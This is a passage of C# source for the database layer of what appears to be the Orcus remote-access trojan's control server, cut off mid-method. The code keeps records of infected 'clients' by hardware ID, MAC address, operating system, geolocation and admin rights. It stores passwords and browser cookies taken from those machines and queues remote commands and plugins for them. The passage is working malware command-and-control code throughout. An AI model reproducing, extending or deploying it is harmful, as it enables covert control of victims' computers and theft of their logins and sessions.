using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Timers;
using System.Xml.Serialization;
using Mono.Data.Sqlite;
using NLog;
using Orcus.Server.Core.Database.FileSystem;
using Orcus.Server.Core.Database.Update;
using Orcus.Shared.Commands.ComputerInformation;
using Orcus.Shared.Commands.DataManager;
using Orcus.Shared.Commands.ExceptionHandling;
using Orcus.Shared.Commands.Password;
using Orcus.Shared.Connection;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.NetSerializer;

namespace Orcus.Server.Core.Database
{
    public class DatabaseManager : IDisposable
    {
        private static readonly Logger Logger = LogManager.GetLogger("Database");

        private readonly object _clientsConnectedUpdateLock = new object();
        private readonly Timer _newDayTimer;
        private readonly object _transactionLock = new object();
        private SqliteConnection _sqliteConnection;

        public DatabaseManager(string path)
        {
            Path = path;
            _newDayTimer = new Timer((DateTime.UtcNow.Date.AddDays(1) - DateTime.UtcNow).TotalMilliseconds);
            _newDayTimer.Elapsed += NewDayTimerOnElapsed;
        }

        public long Exceptions { get; set; }
        public string Path { get; }

        public void Dispose()
        {
            _sqliteConnection?.Close();
        }

        public void Load()
        {
            var sqlDatabase = new FileInfo(Path);
            var createTables = false;
            if (!sqlDatabase.Exists)
            {
                Logger.Info("Database not found, creating database");
                SqliteConnection.CreateFile(sqlDatabase.FullName);
                createTables = true;
            }

            _sqliteConnection = new SqliteConnection($"Data Source={sqlDatabase.FullName};Version=3;");
            _sqliteConnection.Open();
            Logger.Debug("Database opened");

            if (createTables)
            {
                Logger.Info("Creating tables...");
                DatabaseBuilder.CreateTables(_sqliteConnection);
            }
            else
            {
                var upgradeNeeded = false;
                using (
                    var command =
                        new SqliteCommand(
                            "SELECT count(*) FROM sqlite_master WHERE type='table' AND name='DynamicCommandEvent'",
                            _sqliteConnection))
                {
                    if ((long) command.ExecuteScalar() == 0)
                        upgradeNeeded = true;
                }

                if (upgradeNeeded)
                {
                    Logger.Info("Old database detected, begin upgrade");
                    _sqliteConnection = DatabaseUpgrader2.UpgradeDatabase(sqlDatabase.FullName, _sqliteConnection);
                }

                using (
                    var command = new SqliteCommand("SELECT COUNT(*) FROM `Exception`",
                        _sqliteConnection))
                    Exceptions = (long) command.ExecuteScalar();

                CheckClientConnectedStatistics();
            }

            _newDayTimer.Start();
        }

        private void NewDayTimerOnElapsed(object sender, ElapsedEventArgs elapsedEventArgs)
        {
            Logger.Debug("A new day has come");
            _newDayTimer.Interval = (DateTime.UtcNow.Date.AddDays(1) - DateTime.UtcNow).TotalMilliseconds;
            CheckClientConnectedStatistics();
        }

        public bool GetClient(string hardwareId, out ClientData clientData)
        {
            Logger.Debug("Get client with hardware id {0}", hardwareId);

            clientData = null;

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            "SELECT Id, UserName, ClientGroup, OSName, OSType, Language, LastSeen, LENGTH(ComputerInformation), MacAddress, (SELECT COUNT(*) FROM RecoveredPassword WHERE ClientId=Id LIMIT 1) FROM `Client` WHERE HardwareId=@hardwareId LIMIT 1",
                            _sqliteConnection))
                {
                    command.Parameters.AddWithValue("@hardwareId", hardwareId);

                    using (var reader = command.ExecuteReader())
                    {
                        if (!reader.Read())
                        {
                            Logger.Debug("Client with hardware id {0} was not found", hardwareId);
                            return false;
                        }

                        clientData = new ClientData
                        {
                            Id = reader.GetInt32(0),
                            UserName = reader.GetString(1),
                            Group = reader.GetString(2),
                            HardwareId = hardwareId,
                            OSName = reader.GetString(3),
                            OSType = (OSType) reader.GetInt32(4),
                            Language = reader.GetString(5),
                            LastSeen = DateTime.Parse(reader.GetString(6), CultureInfo.InvariantCulture),
                            IsComputerInformationAvailable = !reader.IsDBNull(7) && reader.GetInt32(7) > 0,
                            MacAddress = reader.IsDBNull(8) ? null : (byte[]) reader[8],
                            IsPasswordDataAvailable = reader.GetInt64(9) > 0
                        };

                        Logger.Debug("Client with hardware id {0} found (CI-{1})", hardwareId, clientData.Id);

                        return true;
                    }
                }
        }

        public int AddClient(string username, string hardwareId, string osName, int osType, string language,
            string group, byte[] macAddress)
        {
            Logger.Debug("Add new client to database with hardware id={0}, user name={1}, group={2}", hardwareId, username, group);

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            "INSERT INTO `Client` (UserName, HardwareId, OSName, OSType, Language, LastSeen, ClientGroup, MacAddress) VALUES (@username, @hardwareId, @osName, @osType, @language, @lastSeen, @group, @macAddress); SELECT last_insert_rowid()",
                            _sqliteConnection))
                {
                    command.Parameters.AddWithValue("@username", username);
                    command.Parameters.AddWithValue("@hardwareId", hardwareId);
                    command.Parameters.AddWithValue("@osName", osName);
                    command.Parameters.AddWithValue("@osType", osType);
                    command.Parameters.AddWithValue("@language", language);
                    command.Parameters.AddWithValue("@lastSeen", DateTime.UtcNow);
                    command.Parameters.AddWithValue("@group", group);
                    command.Parameters.AddWithValue("@macAddress", macAddress);
                    return (int) (long) command.ExecuteScalar();
                }
        }

        public void RefreshClient(int clientId, string username, string osName, int osType, string language, byte[] macAddress)
        {
            Logger.Debug("Refresh client with id={0}, user name={1}", clientId, username);

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            "UPDATE `Client` SET UserName=@username, OSName=@osName, OSType=@osType, Language=@language, LastSeen=@lastSeen, MacAddress=@macAddress WHERE Id=@id",
                            _sqliteConnection)
                    )
                {
                    command.Parameters.AddWithValue("@username", username);
                    command.Parameters.AddWithValue("@osName", osName);
                    command.Parameters.AddWithValue("@osType", osType);
                    command.Parameters.AddWithValue("@language", language);
                    command.Parameters.AddWithValue("@lastSeen", DateTime.UtcNow);
                    command.Parameters.AddWithValue("@macAddress", macAddress);
                    command.Parameters.AddWithValue("@id", clientId);
                    command.ExecuteNonQuery();
                }
        }

        public void RemoveClient(int clientId)
        {
            Logger.Debug("Remove client with id={0} (remove from clients, data, passwords, cookies, dynamic command events)", clientId);

            lock (_transactionLock)
            {
                using (
                    var command = new SqliteCommand($"SELECT FileName FROM `Data` WHERE ClientId={clientId}",
                        _sqliteConnection))
                using (var reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        var file = DataSystem.GetFile(new Guid(reader.GetString(0)));
                        file?.Delete();
                    }
                }

                using (var transaction = _sqliteConnection.BeginTransaction())
                {
                    using (var command = _sqliteConnection.CreateCommand())
                    {
                        command.Transaction = transaction;
                        command.Parameters.AddWithValue("@clientId", clientId);

                        command.CommandText = "DELETE FROM `Client` WHERE Id=@clientId";
                        command.ExecuteNonQuery();

                        command.CommandText = "DELETE FROM `Data` WHERE ClientId=@clientId";
                        command.ExecuteNonQuery();

                        command.CommandText = "DELETE FROM `RecoveredPassword` WHERE ClientId=@clientId";
                        command.ExecuteNonQuery();

                        command.CommandText = "DELETE FROM `RecoveredCookie` WHERE ClientId=@clientId";
                        command.ExecuteNonQuery();

                        command.CommandText = "DELETE FROM `DynamicCommandEvent` WHERE ClientId=@clientId";
                        command.ExecuteNonQuery();
                    }

                    transaction.Commit();
                }
            }
        }

        public void SetLastSeen(int clientId)
        {
            Logger.Debug("Set last seen of client CI-{0} to now", clientId);

            lock (_transactionLock)
                using (
                    var command = new SqliteCommand("UPDATE `Client` SET LastSeen=@lastSeen WHERE Id=@id",
                        _sqliteConnection))
                {
                    command.Parameters.AddWithValue("@lastSeen", DateTime.UtcNow);
                    command.Parameters.AddWithValue("@id", clientId);
                    command.ExecuteNonQuery();
                }
        }

        public void SetComputerInformation(ComputerInformation information, int clientId)
        {
            Logger.Debug("Set computer information of client CI-{0}", clientId);

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand("UPDATE `Client` SET ComputerInformation=@computerInformation WHERE Id=@id",
                            _sqliteConnection))
                {
                    command.Parameters.AddWithValue("@computerInformation",
                        new Serializer(typeof (ComputerInformation)).Serialize(information));
                    command.Parameters.AddWithValue("@id", clientId);
                    command.ExecuteNonQuery();
                }
        }

        public void AddPasswords(List<RecoveredPassword> recoveredPasswords, List<RecoveredCookie> recoveredCookies,
            int clientId)
        {
            Logger.Debug("Add passwords and cookies to client CI-{0}", clientId);

            lock (_transactionLock)
                using (var transaction = _sqliteConnection.BeginTransaction())
                {
                    using (var command = _sqliteConnection.CreateCommand())
                    {
                        command.Transaction = transaction;

                        foreach (var password in recoveredPasswords)
                        {
                            command.CommandText =
                                $"INSERT INTO RecoveredPassword (ClientId, UserName, Password, Field1, Field2, PasswordType, Application) SELECT {clientId}, @userName, @password, @field1, @field2, {(byte) password.PasswordType}, @application WHERE NOT EXISTS(SELECT 1 FROM RecoveredPassword WHERE ClientId={clientId} AND UserName=@userName AND Password=@password AND Field1=@field1 AND Field2=@field2 AND PasswordType={(byte) password.PasswordType} AND Application=@application); ";
                            command.Parameters.AddWithValue("@userName", password.UserName ?? "");
                            command.Parameters.AddWithValue("@password", password.Password ?? "");
                            command.Parameters.AddWithValue("@field1", password.Field1 ?? "");
                            command.Parameters.AddWithValue("@field2", password.Field2 ?? "");
                            command.Parameters.AddWithValue("@application", password.Application);
                            command.ExecuteNonQuery();

                            command.Parameters.Clear();
                        }
                    }

                    using (var command = _sqliteConnection.CreateCommand())
                    {
                        command.Transaction = transaction;
                        foreach (var cookie in recoveredCookies)
                        {
                            command.CommandText =
                                $"INSERT INTO RecoveredCookie (ClientId, Host, Name, Value, Path, ExpiresUtc, Secure, HttpOnly, Application) SELECT {clientId}, @host, @name, @value, @path, @expiresUtc, @secure, @httpOnly, @application WHERE NOT EXISTS(SELECT 1 FROM RecoveredCookie WHERE ClientId={clientId} AND Host=@host AND Name=@name AND Value=@value AND Path=@path AND ExpiresUtc=@expiresUtc AND Secure=@secure AND HttpOnly=@httpOnly AND Application=@application)";
                            command.Parameters.AddWithValue("@host", cookie.Host);
                            command.Parameters.AddWithValue("@name", cookie.Name);
                            command.Parameters.AddWithValue("@value", cookie.Value);
                            command.Parameters.AddWithValue("@path", cookie.Path);
                            command.Parameters.AddWithValue("@expiresUtc", cookie.ExpiresUtc);
                            command.Parameters.AddWithValue("@secure", cookie.Secure ? 1 : 0);
                            command.Parameters.AddWithValue("@httpOnly", cookie.HttpOnly ? 1 : 0);
                            command.Parameters.AddWithValue("@application", cookie.ApplicationName);
                            command.ExecuteNonQuery();

                            command.Parameters.Clear();
                        }
                    }

                    transaction.Commit();
                }
        }

        public ComputerInformation GetCompuerInformation(int clientId)
        {
            Logger.Debug("Get computer information of client CI-{0}", clientId);

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand("SELECT ComputerInformation FROM `Client` WHERE Id=@id",
                            _sqliteConnection))
                {
                    command.Parameters.AddWithValue("@id", clientId);
                    using (var reader = command.ExecuteReader())
                    {
                        if (reader.Read())
                        {
                            var value = (byte[]) reader["ComputerInformation"];
                            return value != null
                                ? new Serializer(typeof (ComputerInformation)).Deserialize<ComputerInformation>(value)
                                : null;
                        }
                    }
                }

            return null;
        }

        public PasswordData GetPasswords(int clientId)
        {
            Logger.Debug("Get passwords and cookies of client CI-{0}", clientId);

            var result = new PasswordData
            {
                Passwords = new List<RecoveredPassword>(),
                Cookies = new List<RecoveredCookie>()
            };

            lock (_transactionLock)
            {
                using (
                    var command =
                        new SqliteCommand(
                            "SELECT UserName, Password, Field1, Field2, PasswordType, Application FROM `RecoveredPassword` WHERE ClientId=@id",
                            _sqliteConnection))
                {
                    command.Parameters.AddWithValue("@id", clientId);
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            result.Passwords.Add(new RecoveredPassword
                            {
                                UserName = reader.IsDBNull(0) ? null : reader.GetString(0),
                                Password = reader.IsDBNull(1) ? null : reader.GetString(1),
                                Field1 = reader.IsDBNull(2) ? null : reader.GetString(2),
                                Field2 = reader.IsDBNull(3) ? null : reader.GetString(3),
                                PasswordType = (PasswordType) reader.GetInt32(4),
                                Application = reader.IsDBNull(5) ? null : reader.GetString(5)
                            });
                        }
                    }
                }

                using (
                    var command =
                        new SqliteCommand(
                            "SELECT Host, Name, Value, Path, ExpiresUtc, Secure, HttpOnly, Application FROM `RecoveredCookie` WHERE ClientId=@id",
                            _sqliteConnection))
                {
                    command.Parameters.AddWithValue("@id", clientId);
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            result.Cookies.Add(new RecoveredCookie
                            {
                                Host = reader.GetString(0),
                                Name = reader.GetString(1),
                                Value = reader.GetString(2),
                                Path = reader.GetString(3),
                                ExpiresUtc = reader.GetDateTime(4),
                                Secure = reader.GetInt32(5) == 1,
                                HttpOnly = reader.GetInt32(6) == 1,
                                ApplicationName = reader.GetString(7)
                            });
                        }
                    }
                }
            }

            return result;
        }

        public void SetGroup(string group, int clientId)
        {
            Logger.Debug("Set group of client CI-{0} to {1}", clientId, group);

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand("UPDATE `Client` SET ClientGroup=@group WHERE Id=@id",
                            _sqliteConnection))
                {
                    command.Parameters.AddWithValue("@group", group);
                    command.Parameters.AddWithValue("@id", clientId);
                    command.ExecuteNonQuery();
                }
        }

        public void AddException(int clientId, ExceptionInfo exceptionInfo)
        {
            Logger.Debug("Add exception from client CI-{0}", clientId);

            var serializer = new Serializer(typeof (ExceptionInfo));
            var data = serializer.Serialize(exceptionInfo);
            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            "INSERT INTO `Exception` (ClientId, Timestamp, Data) VALUES (@clientId, @timestamp, @data)",
                            _sqliteConnection))
                {
                    command.Parameters.AddWithValue("@clientId", clientId);
                    command.Parameters.AddWithValue("@timestamp", exceptionInfo.Timestamp);
                    command.Parameters.AddWithValue("@data", data);
                    command.ExecuteNonQuery();
                }

            Exceptions++;
        }

        public List<ExceptionInfo> GetExceptions(DateTime from, DateTime to)
        {
            Logger.Debug("Get all exceptions from {0:G} to {1:G}", from, to);

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            "SELECT Data FROM `Exception` WHERE Timestamp between @dateFrom AND @dateTo",
                            _sqliteConnection))
                {
                    command.Parameters.AddWithValue("@dateFrom", from);
                    command.Parameters.AddWithValue("@dateTo", to);

                    using (var reader = command.ExecuteReader())
                    {
                        var result = new List<ExceptionInfo>();
                        var serializer = new Serializer(typeof (ExceptionInfo));
                        while (reader.Read())
                        {
                            var data = (byte[]) reader["Data"];
                            result.Add(serializer.Deserialize<ExceptionInfo>(data));
                        }
                        return result;
                    }
                }
        }

        public List<int> GetAllClientIds()
        {
            Logger.Debug("Get the IDs of all existing clients");

            var result = new List<int>();

            lock (_transactionLock)
                using (var command = new SqliteCommand("SELECT Id FROM `Client`", _sqliteConnection))
                using (var reader = command.ExecuteReader())
                    while (reader.Read())
                        result.Add(reader.GetInt32(0));
            return result;
        }

        public IEnumerable<OfflineClientInformation> GetAllClients()
        {
            Logger.Debug("Get all clients");

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            "SELECT Id, UserName, ClientGroup, OSName, OSType, Language, LastSeen, LENGTH(ComputerInformation), MacAddress, (SELECT COUNT(*) FROM RecoveredPassword WHERE ClientId=Id LIMIT 1) FROM `Client`",
                            _sqliteConnection))
                {
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            var client = new OfflineClientInformation
                            {
                                Id = reader.GetInt32(0),
                                UserName = reader.GetString(1),
                                Group = reader.GetString(2),
                                OsName = reader.GetString(3),
                                OsType = (OSType) reader.GetInt32(4),
                                Language = reader.GetString(5),
                                LastSeen = DateTime.Parse(reader.GetString(6), CultureInfo.InvariantCulture),
                                IsComputerInformationAvailable = !reader.IsDBNull(7) && reader.GetInt32(7) > 0,
                                MacAddressBytes = reader.IsDBNull(8) ? null : (byte[]) reader[8],
                                IsPasswordDataAvailable = reader.GetInt64(9) > 0
                            };

                            using (
                                var command2 =
                                    new SqliteCommand($"SELECT Country FROM `GeoLocation` WHERE ClientId={client.Id}",
                                        _sqliteConnection))
                            using (var reader2 = command2.ExecuteReader())
                            {
                                if (reader2.Read())
                                    client.LocatedCountry = reader2.GetString(0);
                            }

                            yield return client;
                        }
                    }
                }
        }

        public Statistics GetStatistics(ConcurrentDictionary<int, Client> onlineClients)
        {
            Logger.Debug("Get statistics");

            var result = new Statistics {ClientsOnline = onlineClients.Count};

            lock (_transactionLock)
            {
                using (var command = new SqliteCommand("SELECT COUNT(*) FROM Client", _sqliteConnection))
                {
                    result.TotalClients = (int) (long) command.ExecuteScalar();
                }

                result.OperatingSystems = new List<ClientCountStatistic<OSType>>();
                using (
                    var command = new SqliteCommand("SELECT OSType, COUNT(OSType) FROM Client GROUP BY OSType",
                        _sqliteConnection))
                {
                    using (var reader = command.ExecuteReader())
                        while (reader.Read())
                            result.OperatingSystems.Add(new ClientCountStatistic<OSType>((OSType) reader.GetInt32(0),
                                reader.GetInt32(1)));
                }

                result.ClientsOnlineToday = onlineClients.Count;
                using (
                    var command =
                        new SqliteCommand("SELECT * FROM Client WHERE LastSeen between @dateToday AND @dateNow",
                            _sqliteConnection))
                {
                    command.Parameters.AddWithValue("@dateToday", DateTime.UtcNow.Date);
                    command.Parameters.AddWithValue("@dateNow", DateTime.UtcNow);
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            var id = reader.GetInt32(0);
                            if (!onlineClients.ContainsKey(id))
                                result.ClientsOnlineToday++;
                        }
                    }
                }

                result.Languages = new List<ClientCountStatistic<string>>();
                using (
                    var command = new SqliteCommand("SELECT Language, COUNT(Language) FROM Client GROUP BY Language",
                        _sqliteConnection))
                {
                    using (var reader = command.ExecuteReader())
                        while (reader.Read())
                            result.Languages.Add(new ClientCountStatistic<string>(reader.GetString(0),
                                reader.GetInt32(1)));
                }

                result.NewClientsConnected = new List<ClientCountStatistic<DateTime>>();
                using (
                    var command = new SqliteCommand("SELECT * FROM `NewClientsStatistic`",
                        _sqliteConnection))
                {
                    using (var reader = command.ExecuteReader())
                        while (reader.Read())
                            result.NewClientsConnected.Add(new ClientCountStatistic<DateTime>(reader.GetDateTime(0),
                                reader.GetInt32(1)));
                }

                result.ClientsConnected = new List<ClientCountStatistic<DateTime>>();
                using (
                    var command = new SqliteCommand("SELECT * FROM `ClientsConnectedStatistic` ORDER BY Timestamp DESC",
                        _sqliteConnection))
                using (var reader = command.ExecuteReader())
                    while (reader.Read())
                        result.ClientsConnected.Add(new ClientCountStatistic<DateTime>(reader.GetDateTime(0),
                            reader.GetInt32(1)));
                using (
                    var command =
                        new SqliteCommand(
                            "SELECT Timestamp, COUNT(Timestamp) FROM `ClientsConnected` WHERE Timestamp = DATE() GROUP BY Timestamp",
                            _sqliteConnection))
                using (var reader = command.ExecuteReader())
                    if (reader.Read())
                        result.ClientsConnected.Insert(0,
                            new ClientCountStatistic<DateTime>(DateTime.Today, reader.GetInt32(1)));

                result.Permissions = new List<ClientCountStatistic<PermissionType>>();
                var clientsWithService =
                    onlineClients.Count(
                        x =>
                            x.Value.ComputerInformation.IsServiceRunning && !x.Value.ComputerInformation.IsAdministrator);
                if (clientsWithService > 0)
                    result.Permissions.Add(new ClientCountStatistic<PermissionType>(PermissionType.Service,
                        clientsWithService));

                var clientsWithAdminRights = onlineClients.Count(x => x.Value.ComputerInformation.IsAdministrator);
                if (clientsWithAdminRights > 0)
                    result.Permissions.Add(new ClientCountStatistic<PermissionType>(PermissionType.Administrator,
                        clientsWithAdminRights));

                var clientsWithoutAnything =
                    onlineClients.Count(
                        x =>
                            !x.Value.ComputerInformation.IsAdministrator &&
                            !x.Value.ComputerInformation.IsServiceRunning);
                if (clientsWithoutAnything > 0)
                    result.Permissions.Add(new ClientCountStatistic<PermissionType>(PermissionType.Limited,
                        clientsWithoutAnything));

                result.DatabaseSize = new FileInfo(Path).Length;
                return result;
            }
        }

        public List<ClientInformation> GetClientInformation(List<int> clients)
        {
            Logger.Debug("Get information about {0} clients", clients.Count);

            var result = new List<ClientInformation>();
            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            $"SELECT Id, UserName, ClientGroup, OSName, OSType, Language, LastSeen, LENGTH(ComputerInformation), MacAddress, (SELECT COUNT(*) FROM RecoveredPassword WHERE ClientId=Id LIMIT 1) FROM `Client` WHERE Id IN ({string.Join(", ", clients.Select(x => x.ToString()).ToArray())})",
                            _sqliteConnection))
                {
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            var client = new OfflineClientInformation
                            {
                                Id = reader.GetInt32(0),
                                UserName = reader.GetString(1),
                                Group = reader.GetString(2),
                                OsName = reader.GetString(3),
                                OsType = (OSType) reader.GetInt32(4),
                                Language = reader.GetString(5),
                                LastSeen = DateTime.Parse(reader.GetString(6), CultureInfo.InvariantCulture),
                                IsComputerInformationAvailable = !reader.IsDBNull(7) && reader.GetInt32(7) > 0,
                                MacAddressBytes = reader.IsDBNull(8) ? null : (byte[])reader[8],
                                IsPasswordDataAvailable = reader.GetInt64(9) > 0
                            };

                            using (
                                var command2 =
                                    new SqliteCommand($"SELECT Country FROM `GeoLocation` WHERE ClientId={client.Id}",
                                        _sqliteConnection))
                            using (var reader2 = command2.ExecuteReader())
                            {
                                if (reader2.Read())
                                    client.LocatedCountry = reader2.GetString(0);
                            }

                            result.Add(client);
                        }
                    }
                }

            return result;
        }

        public int AddDynamicCommand(DynamicCommand dynamicCommand, int pluginId)
        {
            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            "INSERT INTO `DynamicCommand` (Status, DynamicCommand, ParameterDataId, PluginId, Timestamp) VALUES (0, @dynamicCommand, @parameterDataId, @pluginId, @timestamp); SELECT last_insert_rowid()",
                            _sqliteConnection))
                {
                    var dynamicCommandParameter = dynamicCommand.CommandParameter;
                    dynamicCommand.CommandParameter = null;
                    try
                    {
                        using (var stringWriter = new StringWriter())
                        {
                            var xmls = new XmlSerializer(typeof (DynamicCommand));
                            xmls.Serialize(stringWriter, dynamicCommand);
                            command.Parameters.AddWithValue("@dynamicCommand", stringWriter.ToString());
                        }
                    }
                    finally
                    {
                        dynamicCommand.CommandParameter = dynamicCommandParameter;
                    }

                    if (dynamicCommand.CommandParameter == null)
                        command.Parameters.AddWithValue("@parameterDataId", DBNull.Value);
                    else
                        command.Parameters.AddWithValue("@parameterDataId",
                            DataSystem.StoreData(dynamicCommand.CommandParameter).ToString("N"));

                    command.Parameters.AddWithValue("@pluginId", pluginId);
                    command.Parameters.AddWithValue("@timestamp", DateTime.UtcNow);

                    var commandId = (int) (long) command.ExecuteScalar();
                    Logger.Debug("Add dynamic command added with ID {0}", commandId);
                    return commandId;
                }
        }

        public byte[] GetDynamicCommandParameter(int id)
        {
            Logger.Debug("Get parameter of dynamic command {0}", id);

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            $"SELECT ParameterDataId FROM `DynamicCommand` WHERE Id={id} LIMIT 1",
                            _sqliteConnection))
                using (var reader = command.ExecuteReader())
                {
                    string guidStr;
                    if (reader.Read() && !reader.IsDBNull(0) && !string.IsNullOrEmpty(guidStr = reader.GetString(0)))
                        return DataSystem.GetData(new Guid(guidStr));

                    return null;
                }
        }

        public void SetDynamicCommandStatus(int id, DynamicCommandStatus dynamicCommandStatus)
        {
            Logger.Debug("Set status of dynamic command {0} to {1}", id, dynamicCommandStatus);

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand($"UPDATE `DynamicCommand` SET Status={(int) dynamicCommandStatus} WHERE Id={id}",
                            _sqliteConnection))
                    command.ExecuteNonQuery();
        }

        public void AddDynamicCommandEvent(int dynamicCommandId, int clientId, ActivityType activityType, string message)
        {
            //commented out because it's not really important and it will flood the log file because every command with 500 clients will have 1000 events
            //Logger.Debug("Add event of dynamic command {0} from client CI-{1} and type {2}", dynamicCommandId, clientId, activityType);

            lock (_transactionLock)
            {
                using (
                    var command =
                        new SqliteCommand(
                            $"INSERT INTO `DynamicCommandEvent` (DynamicCommandId, ClientId, Timestamp, Status, Message) VALUES ({dynamicCommandId}, {clientId}, @timestamp, {(int)activityType}, @message)",
                            _sqliteConnection))
                {
                    command.Parameters.AddWithValue("@timestamp", DateTime.UtcNow);
                    command.Parameters.AddWithValue("@message", message);
                    command.ExecuteNonQuery();
                }
            }
        }

        public void AddDynamicCommandEvents(IEnumerable<DynamicCommandEvent> dynamicCommandActivities)
        {
            lock (_transactionLock)
                using (var transaction = _sqliteConnection.BeginTransaction())
                using (var command = _sqliteConnection.CreateCommand())
                {
                    command.Transaction = transaction;
                    foreach (var activity in dynamicCommandActivities)
                    {
                        command.CommandText =
                            $"INSERT INTO `DynamicCommandEvent` (DynamicCommandId, ClientId, Timestamp, Status, Message) VALUES ({activity.DynamicCommand}, {activity.ClientId}, @timestamp, {(int) activity.Status}, @message)";
                        command.Parameters.AddWithValue("@timestamp", DateTime.UtcNow);
                        command.Parameters.AddWithValue("@message", activity.Message);
                        command.ExecuteNonQuery();

                        command.Parameters.Clear();
                    }

                    transaction.Commit();
                }
        }

        public RegisteredDynamicCommand GetDynamicCommandById(int dynamicCommandId)
        {
            Logger.Debug("Get dynamic command with ID {0}", dynamicCommandId);

            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            $"SELECT Id, Status, DynamicCommand, PluginId, Timestamp FROM `DynamicCommand` WHERE Id={dynamicCommandId}",
                            _sqliteConnection))
                using (
                    var command2 =
                        new SqliteCommand(
                            "SELECT ClientId, Timestamp, Status, Message FROM `DynamicCommandEvent` WHERE DynamicCommandId=@commandId",
                            _sqliteConnection))
                using (var command3 = new SqliteCommand("SELECT Hash FROM `StaticCommandPlugin` WHERE Id=@pluginId", _sqliteConnection))
                {
                    using (var reader = command.ExecuteReader())
                    {
                        if (!reader.Read())
                            return null;

                        DynamicCommand dynamicCommand;
                        var xmls = new XmlSerializer(typeof(DynamicCommand));

                        using (var stringReader = new StringReader(reader.GetString(2)))
                            dynamicCommand = (DynamicCommand) xmls.Deserialize(stringReader);

                        //Command
                        var registeredDynamicCommand = new RegisteredDynamicCommand
                        {
                            CommandId = dynamicCommand.CommandId,
                            Conditions = dynamicCommand.Conditions,
                            Target = dynamicCommand.Target,
                            ExecutionEvent = dynamicCommand.ExecutionEvent,
                            TransmissionEvent = dynamicCommand.TransmissionEvent,
                            Id = reader.GetInt32(0),
                            Status = (DynamicCommandStatus) reader.GetInt32(1),
                            DynamicCommandEvents = new List<DynamicCommandEvent>(),
                            PluginResourceId = reader.GetInt32(3),
                            Timestamp = reader.GetDateTime(4)
                        };

                        command2.Parameters.AddWithValue("@commandId", registeredDynamicCommand.Id);
                        using (var reader2 = command2.ExecuteReader())
                            while (reader2.Read())
                            {
                                registeredDynamicCommand.DynamicCommandEvents.Add(new DynamicCommandEvent
                                {
                                    ClientId = reader2.GetInt32(0),
                                    Timestamp = reader2.GetDateTime(1),
                                    Status = (ActivityType)reader2.GetInt32(2),
                                    Message = reader2.IsDBNull(3) ? null : reader2.GetString(3),
                                    DynamicCommand = registeredDynamicCommand.Id
                                });
                            }

                        if (registeredDynamicCommand.PluginResourceId > -1)
                        {
                            command3.Parameters.AddWithValue("@pluginId", registeredDynamicCommand.PluginResourceId);
                            using (var reader2 = command3.ExecuteReader())
                            {
                                if (reader2.Read())
                                {
                                    registeredDynamicCommand.PluginHash = (byte[])reader2[0];
                                }
                                else
                                {
                                    Logger.Error(
                                        $"The dynamic command {registeredDynamicCommand.Id} could not be loaded because the plugin with id {registeredDynamicCommand.PluginResourceId} was not found");
                                }
                            }
                        }

                        return registeredDynamicCommand;
                    }
                }
        }

        public List<RegisteredDynamicCommand> GetDynamicCommands(bool onlyActiveCommands = false)
        {
            Logger.Debug("Get all dynamic commands");

            var result = new List<RegisteredDynamicCommand>();
            lock (_transactionLock)
                using (
                    var command =
                        new SqliteCommand(
                            "SELECT Id, Status, DynamicCommand, PluginId, Timestamp FROM `DynamicCommand`" +
                            (onlyActiveCommands ? " WHERE Status=0" : ""),
                            _sqliteConnection))
                using (
                    var command2 =
                        new SqliteCommand(
                            "SELECT ClientId, Timestamp, Status, Message FROM `DynamicCommandEvent` WHERE DynamicCommandId=@commandId",
                            _sqliteConnection))
                using (var command3 = new SqliteCommand("SELECT Hash FROM `StaticCommandPlugin` WHERE Id=@pluginId", _sqliteConnection))
                {
                    using (var reader = command.ExecuteReader())
                    {
                        var xmls = new XmlSerializer(typeof(DynamicCommand));

                        while (reader.Read())
                        {
                            DynamicCommand dynamicCommand;

                            using (var stringReader = new StringReader(reader.GetString(2)))
                                dynamicCommand = (DynamicCommand) xmls.Deserialize(stringReader);

                            //Command
                            var registeredDynamicCommand = new RegisteredDynamicCommand
                            {
                                CommandId = dynamicCommand.CommandId,
                                Conditions = dynamicCommand.Conditions,
                                Target = dynamicCommand.Target,
                                ExecutionEvent = dynamicCommand.ExecutionEvent,
                                TransmissionEvent = dynamicCommand.TransmissionEvent,
                                Id = reader.GetInt32(0),
                                Status = (DynamicCommandStatus) reader.GetInt32(1),
                                DynamicCommandEvents = new List<DynamicCommandEvent>(),
                                PluginResourceId = reader.GetInt32(3),
                                Timestamp = reader.GetDateTime(4)
                            };

                            //Events
                            command2.Parameters.AddWithValue("@commandId", registeredDynamicCommand.Id);
                            using (var reader2 = command2.ExecuteReader())
                                while (reader2.Read())
                                {
                                    registeredDynamicCommand.DynamicCommandEvents.Add(new DynamicCommandEvent
                                    {
                                        ClientId = reader2.GetInt32(0),
                                        Timestamp = reader2.GetDateTime(1),
                                        Status = (ActivityType) reader2.GetInt32(2),
                                        Message = reader2.IsDBNull(3) ? null : reader2.GetString(3),
                                        DynamicCommand = registeredDynamicCommand.Id
                                    });
                                }

                            //Plugin hash
                            if (registeredDynamicCommand.PluginResourceId > -1)
                            {
                                command3.Parameters.AddWithValue("@pluginId", registeredDynamicCommand.PluginResourceId);
